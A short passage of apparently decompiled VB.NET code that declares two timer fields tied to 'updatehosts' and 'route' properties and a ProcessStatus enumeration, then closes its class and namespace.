		<CompilerGenerated()>
		<AccessedThroughProperty("Timer_updatehosts")>
		Private _ItemStatus As Timer

	
		<CompilerGenerated()>
		<AccessedThroughProperty("Timer_route")>
		Private facadeStatus As Timer

	
		Public Enum ProcessStatus
		
			Running
		
			Suspended
		
			NotResponding
		
			NotFound
		End Enum
	End Class
End Namespace
